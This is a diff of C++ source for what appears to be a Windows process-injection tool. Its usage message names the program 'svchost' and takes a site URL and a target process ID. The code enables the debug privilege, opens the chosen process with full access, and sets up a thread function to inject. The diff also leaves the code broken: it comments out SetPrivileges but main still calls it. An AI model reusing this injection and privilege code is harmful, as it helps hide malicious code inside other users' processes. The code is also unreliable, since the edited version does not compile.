@@ -5,7 +5,6 @@
 
 #define DATA_CHUNK_SIZE 1024
 #define CODE_CHUNK_SIZE 1024
-#define USAGE_MESSAGE   "svchost [site url] [process id]"
 
 #define ASSERT( expr, msg )\
   if ( !expr ){\
@@ -46,29 +45,29 @@ static DWORD ThreadFunc( InjData *pData )
 }
 static void DummyFunc() {}
 
-void SetPrivileges()
-{
-  HANDLE hToken;
-
-  OpenThreadToken( GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken );
-
-  TOKEN_PRIVILEGES tp;
-  memset( &tp, 0, sizeof( tp ) );
-  LUID luid;
-
-  LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid );
-
-  tp.PrivilegeCount = 1;
-  tp.Privileges[0].Luid = luid;
-
-  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-  AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL );
-}
+//void SetPrivileges( HANDLE hThread )
+//{
+//  HANDLE hToken;
+//
+//  ASSERT( OpenThreadToken( hThread, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken ), "opening access token failed =(" );
+//
+//  TOKEN_PRIVILEGES tp;
+//  memset( &tp, 0, sizeof( tp ) );
+//  LUID luid;
+//
+//  LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid );
+//
+//  tp.PrivilegeCount = 1;
+//  tp.Privileges[0].Luid = luid;
+//
+//  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+//
+//  AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL );
+//}
 
 int main( int argc, char *argv[] )
 {
-  ASSERT( ( argc == 3 ), USAGE_MESSAGE );
+  ASSERT( ( argc == 3 ), ( std::string( argv[0] ) + " [site url] [process id]" ).c_str() );
 
   // data
   HANDLE    hProc;
@@ -87,7 +86,7 @@ int main( int argc, char *argv[] )
   memset( &injData.pi, 0, sizeof( injData.pi ) );
 
   // Step 1: Get full access to remote process
-  SetPrivileges();
+  SetPrivileges(  );
   hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi( argv[2] ) );
   ASSERT( hProc != NULL, "opening process with full access rights failed =(" );
 
